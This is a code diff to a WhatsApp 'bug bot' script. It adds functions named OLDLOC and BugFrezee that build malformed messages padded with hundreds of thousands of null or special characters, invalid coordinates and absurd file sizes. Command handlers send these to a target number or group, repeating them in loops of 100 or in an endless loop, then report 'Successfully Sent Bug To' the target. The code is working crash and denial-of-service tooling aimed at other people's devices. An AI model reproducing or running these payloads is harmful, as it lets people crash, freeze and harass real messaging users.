@@ -1667,6 +1667,111 @@ async function menu(target, cap, Ptcp = false) {
 			);
 		};
 
+const TypeNull = {
+            key: {
+                remoteJid: '✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞',
+                fromMe: false,
+                participant: '0@s.whatsapp.net'
+            },
+            message: {
+                "interactiveResponseMessage": {
+                    "body": {
+                        "text": "Sent",
+                        "format": "DEFAULT"
+                    },
+                    "nativeFlowResponseMessage": {
+                        "name": "galaxy_message",
+                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"★ ᴍᴀᴋɪɴᴏ ᴅᴏᴍᴀɪɴ ★\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"phoenixgibson007@gmail.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                        "version": 3
+                    }
+                }
+            }
+        }
+       
+      
+   async function OLDLOC(target, QBug) {
+var etc = await generateWAMessageFromContent(target, proto.Message.fromObject({
+    viewOnceMessage: {
+    message: {
+      interactiveMessage: {
+        header: {
+          title: "✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞\n★ ᴍᴀᴋɪɴᴏ ᴅᴏᴍᴀɪɴ ★\n",
+          locationMessage: {
+            degreesLatitude: -999.03499999999999,
+            degreesLongitude: 999.03499999999999,
+            jpegThumbnail: global.thumb
+          },
+          hasMediaAttachment: true
+        },
+        body: {
+          text: "\u0000" + "ꦾ".repeat(90000)
+        },
+        nativeFlowMessage: {
+          messageParamsJson: "\u0000".repeat(55000)
+        },
+        carouselMessage: {}
+      }
+    }
+  }
+}), { userJid: target, quoted: QBug })
+await XeonBotInc.relayMessage(target, etc.message, { messageId: etc.key.id })
+};
+async function BugFrezee(target) {
+            XeonBotInc.relayMessage(
+                target,
+                {
+                    viewOnceMessage: {
+                        message: {
+                            documentMessage: {
+                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
+                                mimetype: "application/pdf",
+                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
+                                fileLength: "1991837291999",
+                                pageCount: 199183729199991,
+                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
+                                fileName: "DeepDocumentDpr",
+                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
+                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
+                                mediaKeyTimestamp: "1728631701",
+                                contactVcard: true,
+                                caption: " ꦾ".repeat(20) + "@1".repeat(90000),
+                                contextInfo: {
+                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "★ ᴍᴀᴋɪɴᴏ ᴅᴏᴍᴀɪɴ ★" }],
+                                    isForwarded: true,
+                                    quotedMessage: {
+                                        interactiveResponseMessage: {
+                                            body: {
+                                                text: "Sent",
+                                                format: "DEFAULT"
+                                            },
+                                            nativeFlowResponseMessage: {
+                                                name: "galaxy_message",
+                                                paramsJson: `{
+                "screen_2_OptIn_0": true,
+                "screen_2_OptIn_1": true,
+                "screen_1_Dropdown_0": "★ ᴍᴀᴋɪɴᴏ ᴅᴏᴍᴀɪɴ ★",
+                "screen_1_DatePicker_1": "1028995200000",
+                "screen_1_TextInput_2": "phoenixgibson007@gmail.com",
+                "screen_1_TextInput_3": "94643116",
+                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(700000)}",
+                "screen_0_TextInput_1": "Why?",
+                "screen_0_Dropdown_2": "001-Grimgar",
+                "screen_0_RadioButtonsGroup_3": "0_true",
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+                                        }`,
+                                                version: 3
+                                            },
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                },
+                { participant: { jid: target } }
+            );            
+        };
         switch (command) {
 case 'but': {
 if (!isPremium) return replygcxeon(mess.prem)
@@ -2027,10 +2132,12 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
 let target = q
 for (let i = 0; i < 100; i++) {
-caltx(target)
+await caltx(target)
 await galx(target, Ptcp = false)
 await ioscrash(target)
 await freezegc(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull)
 await ioscrash(target)
 await galx(target, Ptcp = false)
 await callbg(target)
@@ -2052,7 +2159,8 @@ await galx(target, Ptcp = true)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
-await bugpayflow(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull)
 await beta(betaq, target)
 }
 replygcxeon(`Successfully Sent Bug To ${target}`)
@@ -2071,7 +2179,8 @@ await galx(target, Ptcp = true)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
-await bugpayflow(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull)
 await beta(betaq, target)
 }
 replygcxeon(`Successfully Sent Bug To ${target}`)
@@ -2087,7 +2196,8 @@ let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (;;) {
 await BugPayment(target)
-await bugpayflow(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull) 
 await galx(target, Ptcp = true)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
